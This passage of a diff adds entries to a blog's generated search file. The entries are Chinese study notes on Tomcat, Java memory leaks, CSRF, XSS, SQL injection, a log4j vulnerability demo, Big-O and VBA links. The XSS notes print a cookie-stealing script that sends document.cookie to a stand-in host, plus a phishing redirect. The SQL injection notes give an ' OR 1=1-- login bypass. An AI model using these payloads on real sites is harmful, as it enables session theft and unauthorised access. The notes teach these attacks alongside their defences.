class="line">        - WEB-INF       web應用的配置訊息(web-inf下的東西是受保護的，客戶無法直接存取)</span><br><span class="line">            - lib       引入的第三方包</span><br><span class="line">            - web.xml   web的配置訊息</span><br><span class="line">  - 部屬以後：(項目部屬是把WebContent下面的所有內容發布)</span><br><span class="line">    - FirstWeb：</span><br><span class="line">        - WebContent：</span><br><span class="line">            - META-INFO</span><br><span class="line">            - WEB-INF</span><br><span class="line">                - classes   java文件全類名儲存：把classes目錄也叫做類路徑</span><br><span class="line">                - lib</span><br><span class="line">                - web.xml</span><br><span class="line">            - index.html</span><br></pre></td></tr></table></figure><hr><h2 id="reference-24">reference</h2><ul><li>Java Web - 雷豐陽 P67 - P73</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Java </category>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Tomcat </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Java Memory Leak</title>
+      <link href="/2022/05/10/2022-2022-05-10-java-memory-leak/"/>
+      <url>/2022/05/10/2022-2022-05-10-java-memory-leak/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Concept-4">Concept</h2><blockquote><p>不再使用的物件且無法被GC回收<br><img src="/assets/img/blog/2022/20220510/MemoryLeakDef_01.jpg" alt="MemoryLeakDef"></p></blockquote><h2 id="原因">原因</h2><h3 id="物件指向靜態變數參考">物件指向靜態變數參考</h3><h3 id="長字串呼叫String-intern-方法">長字串呼叫String.intern()方法</h3><blockquote><p>String.interal() API會將字串放入String pool中，在pool中的字串將不會被GC回收</p></blockquote><ul><li>Java 7以前，需要操作長字串，則加大permanent generation，-XX:MaxPermSize = <size></li><li>Java 8，Metaspace取代PermGen，不會導致OutOfMemoryError</li></ul><h3 id="Unclosed-Streams">Unclosed Streams</h3><blockquote><p>例如：BufferedReader等類型Stream</p></blockquote><h3 id="Unclosed-connection">Unclosed connection</h3><blockquote><p>例如：資料庫、FTP Server、URLConnection</p></blockquote><h3 id="未實作hashCode-與equals的物件寫入HashSet">未實作hashCode()與equals的物件寫入HashSet</h3><blockquote><p>由於物件未實現equals與hashCode導致加入HashSet中的物件，重複的物件只會增加不會移除</p></blockquote><h2 id="Memory-Profilers">Memory Profilers</h2><ul><li>jps：查看當前系統有哪些java process</li><li>jmap：查看heap占用情形，jmap -heap processId</li><li>jconsole：圖形介面，多功能監測工具</li><li>jvisualvm： <a href="https://visualvm.github.io/">visualVM</a></li></ul><hr><h2 id="reference-23">reference</h2><ul><li><a href="https://stackify.com/memory-leaks-java/">How Memory Leaks Happen in a Java Application - Stackify</a></li><li><a href="https://sematext.com/blog/java-memory-leaks/#toc-threadlocals-8">How to Detect Memory Leaks in Java: Common Causes &amp; Best Tools to Avoid Them - sematext</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Java </category>
+          
+          <category> JVM </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JVM </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Cross Site Request Forgery (CSRF)</title>
+      <link href="/2022/05/05/2022-2022-05-05-security-csrf/"/>
+      <url>/2022/05/05/2022-2022-05-05-security-csrf/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Concept-3">Concept</h2><p>CSRF 就是在不同的 domain 底下卻能夠偽造出「使用者本人發出的 request」，例如A銀行網站存在CSRF攻擊，你在登入的狀況下造訪駭客網站，但該網站隱藏他要發送到A銀行的Request，因瀏覽器機制，你造訪駭客網站而發送到A銀行的請求會幫你把cookie帶上，如此就會像是本人發送的請求。CSRF如何達到攻擊是因為下面兩個因素：</p><h3 id="Same-Origin-Policy-的不足之處">Same Origin Policy 的不足之處</h3><p>Same Origin Policy雖然可以擋下透過script組成的Origin HTTP Request，例如fetch、ajax等，但透過HTML標籤的HTTP Request卻無法阻擋</p><h3 id="瀏覽器處理-Cookies-的方式">瀏覽器處理 Cookies 的方式</h3><p>如果對同domain對象發送的HTTP Request，瀏覽器會將該domain的Cookies一併送出。</p><h2 id="常見的攻擊手法-2">常見的攻擊手法</h2><h3 id="image-tag">image tag</h3><p>通常被用來發HTTP POST/ DELETE / PUT Request。</p><h3 id="form-submit">form submit</h3><p>需注意form只支援 application/x-www-form-urlencoded、 multipart/form-data 以及 text/plain 這三種 content type</p><h3 id="form-iframe-submit">form + iframe submit</h3><p>駭客替使用者發送一個HTTP Request，不希望使用者點下按鈕馬上發現，通常會將結果頁面輸出到iframe裡，再將iframe用css隱藏起來。</p><h2 id="防禦方式-2">防禦方式</h2><h3 id="Synchronizer-Token-Pattern">Synchronizer Token Pattern</h3><p>使用者在發送HTTP Request時，需要將頁面上的某個特徵傳回給Server，也就是CSRF token，token需要符合以下條件</p><ul><li>Server根據這個Session存在一個CSRF token</li><li>每次進入該頁面，CSRF token都要變，具有時效性</li><li>要在使用者的登入頁面才能取得CSRF token</li><li>CSRF token必須是不可預測的</li></ul><h4 id="Synchronizer-Token-Pattern常見作法">Synchronizer Token Pattern常見作法</h4><ul><li>Form Submissions<br>將 CSRF token 放在 form 的隱藏欄位一並送出</li><li>Ajax Requests<br>將 CSRF token 放在 header 的 meta 欄位，再用 JavaScript 取出送出</li></ul><h4 id="Synchronizer-Token-Pattern缺點">Synchronizer Token Pattern缺點</h4><ul><li>頁面若有XSS漏洞那麼CSRF就有可能被駭</li><li>必須要在Server端存放CSRF token，佔據空間</li></ul><h3 id="Submit-Cookie">Submit Cookie</h3><p>Synchronizer Token Pattern 唯一的不同之處，Server 端不存放 CSRF token．而是將 CSRF token 存在 cookie 裡面，<br>發送Request到Server時，Server比較頁面提交的CSRF token與Request中的CSRF token</p><h4 id="常見作法">常見作法</h4><ul><li>Form Submissions</li><li>Ajax Requests</li></ul><h4 id="優點">優點</h4><ul><li>不需要在Server存放CSRF token</li></ul><h4 id="缺點">缺點</h4><ul><li>頁面若有XSS漏洞，駭客就可以串改Cookie與CSRF token，建議將CSRF token在Cookie儲存時設定屬性為HTTP Only</li></ul><h3 id="Triple-Submit-Cookie">Triple Submit Cookie</h3><p>除了與Dounle Submit相同的概念外，多增加在Server與Cookie上存了CSRF token name，所以Request發送到Server，除了比對Cookie 中token value與使用者提交的token value外，需比較Server上的CSRF token name與Cookie中的CSRF token name</p><h4 id="缺點-2">缺點</h4><ul><li>頁面若有XSS漏洞，一樣會失效</li><li>需要在Server維護CSRF token name</li></ul><h3 id="Same-Site-Cookie">Same Site Cookie</h3><p>原本瀏覽器只判斷 HTTP Request 的「對象」來帶 Cookie ，現在要求要同時判斷 HTTP Request 的「來源」是否跟「對象」為同源，才決定要不要自動帶Cookie。</p><h4 id="缺點-3">缺點</h4><ul><li>並非所有瀏覽器都有支援</li><li></li></ul><hr><h2 id="reference-22">reference</h2><ul><li><a href="https://hahow.in/courses/5aca2dc9d21aee001e55b296/main">經典駭客攻擊教程：給每個人的網站安全入門 - hahow</a></li><li><a href="https://blog.techbridge.cc/2017/02/25/csrf-introduction/">讓我們來談談 CSRF - TechBridge</a></li><li><a href="https://blog.huli.tw/2017/08/27/ajax-and-cors/">輕鬆理解 Ajax 與跨來源請求 - Huli blog</a></li><li><a href="https://blog.huli.tw/2021/02/19/cors-guide-1/">CORS 完全手冊（一）：為什麼會發生 CORS 錯誤？ - Huli blog</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> security </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Cross Site Scripting (XSS)</title>
+      <link href="/2022/05/04/2022-2022-05-04-security-cross-site-scripting/"/>
+      <url>/2022/05/04/2022-2022-05-04-security-cross-site-scripting/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Concept-2">Concept</h2><p>駭客輸入惡意的程式碼在網站上，若該網站沒有驗證使用者輸入，就直接輸出在網頁上，惡意的程式碼就會被執行，造成點擊到該網頁的人遭受到攻擊。簡單來說就是駭客可以在你的網站上面執行 JavaScript 的程式碼。<br>概念上像是埋一個地雷在受害的網頁上，主要分為三類：</p><ul><li>Relfective XSS</li><li>Persistent/Stored XSS</li><li>Dom-based XSS</li></ul><h3 id="Relfective-XSS">Relfective XSS</h3><ul><li>例如該網站直接將使用者搜尋的輸入，直接顯示在網頁上<br><img src="/assets/img/blog/20220504/ReflectiveXSS.jpg" alt=""></li></ul><h3 id="Persistent-Stored-XSS">Persistent/Stored XSS</h3><ul><li>不同於 Reflective XSS 的是，該惡意程式碼是被存到網站的資料庫裡面的．惡意程式碼不是當下被輸入的。<br><img src="/assets/img/blog/20220504/StroedXSS.jpg" alt=""></li></ul><h3 id="Dom-based-XSS">Dom-based XSS</h3><ul><li>Dom-based XSS 的攻擊原理跟 Reflective XSS 攻擊原理相似，差別只在 Reflective XSS 有經過 Server 端，而 Dom-based 的攻擊只發生在 Client 端。</li></ul><h2 id="常見的攻擊手法">常見的攻擊手法</h2><h3 id="Redirect-攻擊">Redirect 攻擊</h3><blockquote><p>網址重導致釣魚網站，造成帳號密碼盜取</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span> =<span class="string">&quot;http://tw.yah00.com&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="Virtual-Site-Defacement-攻擊">Virtual Site Defacement 攻擊</h3><blockquote><p>駭客在頁面上插入奇怪的元素，讓你的網站無法被使用</p></blockquote><h3 id="Cookie偷取-Cookie-Theft">Cookie偷取 (Cookie Theft)</h3><blockquote><p>網頁重導並傳送Cookie到目標網站</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span> =<span class="string">&#x27;http://xxx.com?send=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="密碼偷取-Password-Theft">密碼偷取 (Password Theft)</h3><blockquote><p>在頁面插入假的輸入帳號密碼表單，並將帳密傳到駭客主機</p></blockquote><h3 id="Same-Origin-Policy-失能">Same Origin Policy 失能</h3><blockquote><p>有XSS漏洞的網站，駭客插入惡意程式碼，會被視為與的程式碼「同源」，故失去同源政策的保護</p></blockquote><h2 id="防禦方式">防禦方式</h2><h3 id="Contextual-Output-Encoding">Contextual Output Encoding</h3><blockquote><p>針對網頁不同的情境(Context)，在網頁輸出時做特殊編碼處理，讓browser原本會認為程式碼的內容轉為非程式碼處理</p></blockquote><ul><li>HTML Entity Context</li><li>HTML Attributes Context</li><li>URL Fragment Context</li><li>Script Context</li><li>Style Context</li></ul><h3 id="HTML-Sanitization">HTML Sanitization</h3><blockquote><p>在某些情況下需要User輸入程式碼，此時透過Sanitization來過濾惡意程式碼，讓他轉程安全的程式碼</p></blockquote><h3 id="X-Xss-Protection">X-Xss-Protection</h3><blockquote><p>瀏覽器大多支援XSS防護功能，開啟此功能需要在HTTP Resposne header設定</p></blockquote><ul><li>HTTP Resposne header設定</li></ul><blockquote><p>X-Xss-Protection: 1; mode=block</p></blockquote><h3 id="Content-Security-Policy">Content-Security-Policy</h3><blockquote><p>用來跟瀏覽器講說哪些來源的資源可以被載入，哪些不行。做以下的設定，並且不要使用 ‘unsafe-inline’</p></blockquote><ol><li>HTTP Header設定</li></ol><blockquote><p>Content-Security-Policy: script-src ‘self’ ‘nonce-2726c7f26c’</p></blockquote><ol start="2"><li>程式碼</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=<span class="string">&quot;2726c7f26c&quot;</span>&gt;</span><br><span class="line">  <span class="keyword">var</span> inline = <span class="number">1</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="Cookies保護">Cookies保護</h3><blockquote><p>在 HTTP Response Header 中將重要的 Cookie 設定為 HTTP Only．確保該cookie不能被client端程式碼存取。</p></blockquote><ul><li>HTTP Header設定</li></ul><blockquote><p>Set-Cookie: NAME=VALUE; expires=EXPIRES; path=PATH;<br>domain=DOMAIN;secure; httponly;</p></blockquote><hr><h2 id="reference-21">reference</h2><ul><li><a href="https://hahow.in/courses/5aca2dc9d21aee001e55b296/main">經典駭客攻擊教程：給每個人的網站安全入門 - hahow</a></li><li><a href="https://tech-blog.cymetrics.io/posts/huli/xss-history/">XSS 從頭談起：歷史與由來 - Cymetrics Tech Blog</a></li><li><a href="https://tech-blog.cymetrics.io/posts/huli/xss-attack-and-defense/">淺談 XSS 攻擊與防禦的各個環節 - Cymetrics Tech Blog</a></li><li><a href="https://tech-blog.cymetrics.io/posts/huli/xss-history/">防止 XSS 可能比想像中困難 - Cymetrics Tech Blog</a></li><li><a href="https://tech-blog.cymetrics.io/posts/jo/zerobased-cross-site-scripting/">零基礎資安系列（二）-認識 XSS（Cross-Site Scripting） - Cymetrics Tech Blog</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> security </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL Injection</title>
+      <link href="/2022/05/03/2022-2022-05-03-security-sql-injection/"/>
+      <url>/2022/05/03/2022-2022-05-03-security-sql-injection/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Concept">Concept</h2><p>在輸入字串夾帶惡意SQL語句，來改變原有語意，達成竊取或破壞資料的行為</p><h2 id="案例">案例</h2><h3 id="後端SQL語句">後端SQL語句</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//後端sql</span></span><br><span class="line">sql = <span class="string">&quot;SELECT * FROM USER_INFO WHERE Account = (&#x27;&quot;</span>+ account +<span class="string">&quot;&#x27;) AND UserPassword = (&#x27;&quot;</span>+password+<span class="string">&quot;&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="前端輸入訊息">前端輸入訊息</h3><ul><li>account: 'OR 1=1–</li><li>password: 'OR 1=1–</li></ul><h3 id="後端傳送到DB">後端傳送到DB</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> </span><br><span class="line"><span class="keyword">FROM</span> </span><br><span class="line">    USER_INFO </span><br><span class="line"><span class="keyword">WHERE</span> </span><br><span class="line">    Account <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">-- AND UserPassword = &#x27;&#x27; OR 1=1</span></span><br></pre></td></tr></table></figure><ul><li>因為OR 1=1 恆為True，所以就能不需要帳號密碼登入網站</li><li>‘OR 1=1 --，–目的在於清除後面的「’」</li></ul><h2 id="Solution">Solution</h2><ul><li>不要透過+號串接SQL語法</li></ul><h3 id="Query-Parameterization">Query Parameterization</h3><blockquote><p>對SQL語句進行參數化查詢 =&gt; SQL 會形成Excution paln =&gt;不會執行不符合的Excution plan</p></blockquote><ul><li>以Java來說，使用PreparedStatement取代Statement</li></ul><hr><h2 id="reference-20">reference</h2><ul><li><p><a href="https://hahow.in/courses/5aca2dc9d21aee001e55b296/main">經典駭客攻擊教程：給每個人的網站安全入門 - hahow</a></p></li><li><p><a href="https://blog.kennycoder.io/2020/01/09/SQL-injection-%E5%8E%9F%E7%90%86%E4%BB%8B%E7%B4%B9%E8%88%87%E9%98%B2%E7%AF%84%E6%95%99%E5%AD%B8-%E5%B7%A5%E7%A8%8B%E5%B8%AB%E7%B5%95%E4%B8%8D%E8%83%BD%E7%8A%AF%E7%9A%84%E4%BD%8E%E7%B4%9A%E9%8C%AF%E8%AA%A4/">SQL injection 原理介紹與防範教學 - Kenny’s Blog</a></p></li><li><p><a href="https://ithelp.ithome.com.tw/articles/10239093">資訊安全的美味雜炊 iThome - halloworld </a></p></li><li><p><a href="https://tech-blog.cymetrics.io/posts/nick/sqli/">秒懂 SQL Injection - Cymetrics Tech Blog</a></p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> security </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>學習資源筆記</title>
+      <link href="/2022/05/02/2022-2022-05-02-article-collection/"/>
+      <url>/2022/05/02/2022-2022-05-02-article-collection/</url>
+      
+        <content type="html"><![CDATA[<h2 id="舊站連結"><a href="https://dotblogs.azurewebsites.net/duke">舊站連結</a></h2><h2 id="心靈雞湯">心靈雞湯</h2><ul><li><a href="https://www.gvm.com.tw/article/68012">Stay Hungry, Stay Foolish</a></li><li><a href="https://www.ourchinastory.com/zh/1716/%E8%8A%B1%E8%8B%A5%E7%9B%9B%E9%96%8B%20%E8%9D%B4%E8%9D%B6%E8%87%AA%E4%BE%86">花若盛開 蝴蝶自來</a></li></ul><h2 id="學習方法">學習方法</h2><ul><li><a href="https://dotblogs.com.tw/hatelove/2017/03/26/why-engineers-should-keep-blogging">我為什麼鼓勵工程師寫 blog - In 91</a></li><li><a href="https://medium.com/@fchern/%E9%97%9C%E6%96%BC%E8%AE%8A%E5%BC%B7%E9%80%99%E6%AA%94%E4%BA%8B-%E4%B8%80-af73b0cc0cde">關於變強這檔事1-10</a></li><li><a href="https://columns.chicken-house.net/2021/03/01/practice-01/">架構師的修練 #1 刻意練習 - 打好基礎</a></li></ul><h2 id="SQL">SQL</h2><ul><li><a href="https://www.sqlservertutorial.net/">SQL Server Tutorial</a></li><li><a href="https://www.queryexamples.com/sql/category/stored-procedure/">Stroed Procedure examples</a></li></ul><hr><h2 id="reference-19">reference</h2><ul><li><a href="https://medium.com/@fchern">medium - Felix Chern</a></li><li><a href="https://columns.chicken-house.net/about/">安德魯的部落格 - Andrew Wu</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Java log4j vulnerabilities 說明</title>
+      <link href="/2022/04/28/2022-2022-04-28-security-java-log4j-vulnerabilities/"/>
+      <url>/2022/04/28/2022-2022-04-28-security-java-log4j-vulnerabilities/</url>
+      
+        <content type="html"><![CDATA[<h2 id="漏洞說明">漏洞說明</h2><p>log4j2某些功能存在遞迴解析功能，存在JNDI注入漏洞，攻擊者可以直接發出惡意請求，觸發遠端程式碼執行漏洞。依照${}的方式就可以調用JNDI的命令</p><h2 id="漏洞修補歷程">漏洞修補歷程</h2><table><thead><tr><th style="text-align:center">NVD Published Date</th><th style="text-align:center">no</th><th style="text-align:center">Base Score</th><th style="text-align:center">修補版本</th></tr></thead><tbody><tr><td style="text-align:center">2021-12-10</td><td style="text-align:center"><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">CVE-2021-44228</a></td><td style="text-align:center">10.0 CRITICAL</td><td style="text-align:center">2.15</td></tr><tr><td style="text-align:center">2021-12-14</td><td style="text-align:center"><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45046">CVE-2021-45046</a></td><td style="text-align:center">10.0 CRITICAL</td><td style="text-align:center">2.16</td></tr><tr><td style="text-align:center">2021-12-18</td><td style="text-align:center"><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45105">CVE-2021-45105</a></td><td style="text-align:center">5.9 MEDIUM</td><td style="text-align:center">2.17</td></tr></tbody></table><h2 id="Demo-2">Demo</h2><h3 id="升級前">升級前</h3><ul><li>啟動HackService<br><img src="/assets/img/blog/20220428/log4jDemo_01.jpg" alt="start hackservice"></li><li>啟動Web服務<br><img src="/assets/img/blog/20220428/log4jDemo_02.jpg" alt="start springboot app"></li><li>Postman api測試<br><img src="/assets/img/blog/20220428/log4jDemo_03.jpg" alt="postman test"></li><li>web 後台log</li></ul><blockquote><p>執行遠端調用的方法<br><img src="/assets/img/blog/20220428/log4jDemo_04.jpg" alt="web backend log"></p></blockquote><ul><li>主機被開啟小算盤<br><img src="/assets/img/blog/20220428/log4jDemo_05.jpg" alt="started calculator"></li></ul><h3 id="升級至2-17後">升級至2.17後</h3><ul><li>pom.xml修改</li></ul><blockquote><p>2.12.1 修改為2.17<br><img src="/assets/img/blog/20220428/log4jDemo_update_01.jpg" alt="reverse pom.xml"></p></blockquote><ul><li>重新啟動web、hackService</li><li>Postman api測試</li><li>web 後台log</li></ul><blockquote><p>不會執行JNDI的指令，僅會顯示訊息<br><img src="/assets/img/blog/20220428/log4jDemo_update_02.jpg" alt="backend log"></p></blockquote><h3 id="GitHub-source-code-download"><a href="https://github.com/n1046728/log4j2Error">GitHub source code download</a></h3><blockquote><p>程式碼由影片「手把手带你复现log4j史诗级漏洞」的作者<strong>24只羊羊羊</strong>提供，再略為修改</p></blockquote><hr><h2 id="reference-18">reference</h2><ul><li><a href="https://www.bilibili.com/video/BV1ML4y1p7nF?spm_id_from=333.880.my_history.page.click">手把手带你复现log4j史诗级漏洞 - bilibili</a></li><li><a href="https://tech-blog.cymetrics.io/posts/huli/what-is-log4j-and-log4shell/">從監視攝影機理解Log4j跟Log4Shell漏洞 - Cymetrics Tech Blog by Huli</a></li><li><a href="https://www.ithome.com.tw/news/148457">Apache Log4j再釋出2.17版，修補DoS漏洞 - iThome</a></li><li><a href="https://www.ithome.com.tw/news/148391">Log4j 2.15.0修補不全、Apache再釋2.16.0新版，國家駭客已開始行動 - iThome</a></li><li><a href="https://www.ithome.com.tw/news/148337">Apache Log4j日誌框架系統重大漏洞（CVE-2021-44228） - iThome</a></li><li><a href="https://www.trendmicro.com/zh_hk/what-is/apache-log4j-vulnerability.html">甚麼是 Apache Log4J（Log4Shell）漏洞？ - TREND MICRO</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Java </category>
+          
+          <category> security </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> log4j2 </tag>
+            
+            <tag> security </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Time complexity Big-O</title>
+      <link href="/2022/04/13/2022-2022-04-11-data-structure-big-o/"/>
+      <url>/2022/04/13/2022-2022-04-11-data-structure-big-o/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Summary-4">Summary</h2><p>This is notebook copy from below reference.</p><h2 id="Definition">Definition</h2><blockquote><p>f(n) = O(g(n)) means there are positive constant c and n<sub>0</sub> ,such that f(n) &lt;= cg(n) for all n &gt; n<sub>0</sub></p></blockquote><p><img src="/assets/img/blog/20220411/big-o.jpg" alt="big-o"></p><h2 id="Description">Description</h2><ul><li>某演算法的時間函數的<strong>上限(Upper bound)</strong></li><li>只要n大到某一個程度(n<sub>0</sub>)，就保證時間函數f(n)的數值一定小於等與g(n)函數</li><li>在最壞的情況下，該演算法的時間函數f(n)之成長率最多會達到g(n)，而不會超過</li></ul><h2 id="Excercise">Excercise</h2><h3 id="ex1">ex1</h3><ul><li>f(n) = 3n+2, 則 f(n) = O(n)， tip c只要比該項的比該項的<br>常數値常數値大1即可!!再由c去推n<sub>0</sub></li><li>3n+2 &lt;= 4n =&gt; n &gt; 2</li></ul><h3 id="ex2">ex2</h3><ul><li>f(n) = 5n<sup>2</sup>+3n+2, 則 f(n) = O(n<sup>2</sup>)</li><li>5n<sup>2</sup>+3n+2 ≤ 6n<sup>2</sup> =&gt; 3n+2 ≤ n<sup>2</sup> &gt; 取 n<sub>0</sub> = 4</li></ul><h2 id="Order">Order</h2><p><img src="/assets/img/blog/20220411/order.jpg" alt="big-o"></p><hr><h2 id="reference-16">reference</h2><ul><li><a href="http://debussy.im.nuu.edu.tw/sjchen/Datastructure/98/course01.pdf">資料結構課程 - 聯合大學 陳士杰</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> data structure </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Windows task scheduler if a task is already running</title>
+      <link href="/2022/04/13/2022-2022-04-12-windows-task-schedule-attention/"/>
+      <url>/2022/04/13/2022-2022-04-12-windows-task-schedule-attention/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Story-5">Story</h2><p>One job that I setting multiple triggers on task scheduler.The One executes at 17:55 and the another setting on 18:00.My python code only run at 17:55.This problem lies in python code write os.system(“pause”) that will pause present cmd window.When you setting task scheduler with <strong>Do not run new instance</strong>,it may skip your job if previous task not closed.</p><h2 id="Solve">Solve</h2><p>Setting <strong>You can run a new instance in parallel</strong><br><img src="/assets/img/blog/20220412/TaskScheduler_Setting.gif" alt="taks scheduler setting"></p><hr><h2 id="reference-17">reference</h2><ul><li><a href="https://windowsreport.com/schedule-tasks-windows-10/">How to schedule tasks in Windows 10 - windowsreport</a></li><li><a href="https://dotblogs.com.tw/supershowwei/2018/10/29/161209">如何讓 Windows 工作排程器（Task Scheduler）以秒為單位來觸發程序？ - 軟體主廚的程式料理廚房</a></li><li><a href="https://www.codegrepper.com/code-examples/python/python+os+cmd+pause">python os cmd pause - Grepper</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> windows </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> windows </tag>
+            
+            <tag> task scheduler </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Vba Notebook</title>
+      <link href="/2022/04/09/2022-2022-04-09-vba-notebook/"/>
+      <url>/2022/04/09/2022-2022-04-09-vba-notebook/</url>
+      
+        <content type="html"><![CDATA[<h2 id="vba-microsoft-doc"><a href="https://docs.microsoft.com/en-ie/office/vba/api/overview/">vba microsoft doc</a></h2><h2 id="Logging">Logging</h2><ul><li><a href="https://www.bolterauer.de/consulting/dev/vbatools/vba_logging/VBALogging.html#Installation">install framework</a></li></ul><h2 id="Common-function">Common function</h2><ul><li><a href="https://docs.microsoft.com/zh-tw/office/vba/language/reference/user-interface-help/instr-function">InStr</a>：指定另一個字串內某個字串的第一個出現位置</li><li><a href="https://www.howtoexcel.org/split-text-by-delimiter/">split</a></li><li><a href="https://www.techonthenet.com/excel/formulas/replace_vba.php">replace</a></li></ul><h2 id="data-structure">data structure</h2><ul><li>ArrayList<ul><li><a href="https://excelmacromastery.com/vba-arraylist/">https://excelmacromastery.com/vba-arraylist/</a></li><li><a href="https://www.automateexcel.com/vba/arraylist/">https://www.automateexcel.com/vba/arraylist/</a></li></ul></li><li><a href="https://excelmacromastery.com/vba-dictionary/">Dictionary</a></li><li><a href="https://stackoverflow.com/questions/1296225/iterate-over-vba-dictionaries">Dictionary-for each</a></li><li><a href="https://www.automateexcel.com/vba/declare-dim-create-initialize-array/">Array</a></li><li><a href="https://www.automateexcel.com/vba/loop-through-array/">Array-for each</a></li></ul><h2 id="How-to-Select-a-Range-Cell-using">How to Select a Range/Cell using</h2><ul><li><a href="https://excelchamps.com/vba/select-range/#Select_a_Column">How to Select a Range/Cell using VBA in Excel</a></li><li><a href="https://docs.microsoft.com/en-us/previous-versions/office/troubleshoot/office-developer/select-cells-rangs-with-visual-basic">How to Select a Range of Cells on the Active Worksheet</a></li><li><a href="https://stackoverflow.com/questions/439510/can-a-vba-function-in-excel-return-a-range">Can a VBA function in Excel return a range?</a></li></ul><h2 id="VBA-overloading">VBA overloading</h2><ul><li><a href="https://stackoverflow.com/questions/64436/function-overloading-and-udf-in-excel-vba">Function Overloading</a></li></ul><h2 id="conversion">conversion</h2><ul><li><a href="https://docs.microsoft.com/zh-tw/office/vba/language/concepts/getting-started/type-conversion-functions">類型轉換函數</a></li></ul><h2 id="special-case">special case</h2><ul><li><a href="https://www.thespreadsheetguru.com/blog/2015/1/13/how-to-use-vba-code-to-copy-text-to-the-clipboard">How To Use VBA Code To Copy Text To The Clipboard</a></li><li><a href="https://zhuanlan.zhihu.com/p/136217579">regular expression</a></li><li><a href="https://regex101.com/r/i1UX7I/1?_sc_token=v2%253AUYqdEpVJBv4aHULGkq6HR3e6Ym1Bx9Ur6Ux4JBNQVGAZrZfLwBjiNW5eHXXyZycdNr8968PeokVBM5FejM-gIodNkCQGT_2JlkjiTojFhgLvj7wEW103vDp2U-sp9o3Gq37G48sJbiorFaoqk4wihBwjR11S5fKXuUAiWRYT_xjgH-FiZ_g4FqOxRwFhZHSZ">regular expression 101</a></li><li><a href="https://www.automateexcel.com/vba/copy-to-clipboard/">VBA Copy to Clipboard</a></li><li><a href="https://answers.microsoft.com/en-us/outlook_com/forum/all/paste-clipboard-to-outlook-with-vba/a1a27b25-1534-42ac-ae82-281e66ba30b6"><strong>paste clipboard to outlook with vba</strong></a></li><li><a href="https://www.automateexcel.com/vba/hyperlinks/#Add_a_Hyperlink_with_VBA">Add a Hyperlink with VBA</a></li><li><a href="https://www.automateexcel.com/vba/regex/">VBA Regex</a></li><li><a href="https://www.automateexcel.com/vba/send-emails-outlook/">VBA Send Emails from Excel through Outlook</a></li></ul><h2 id="tip">tip</h2><ul><li>物件assign must using keyword <strong>Set</strong></li></ul><h2 id="vba-tutorial">vba tutorial</h2><ul><li><a href="https://ithelp.ithome.com.tw/users/20007221/ironman/833">Excel VBA 的眉眉角角</a></li><li><a href="https://www.automateexcel.com/">automat excel</a></li><li><a href="https://analystcave.com/excel-regex-tutorial/">Excel Regex Tutorial</a></li></ul><h2 id="python">python</h2><ul><li><a href="https://www.jcchouinard.com/python-automation-using-task-scheduler/">setting task schedule</a></li></ul><hr><h2 id="reference-15">reference</h2><ul><li><a 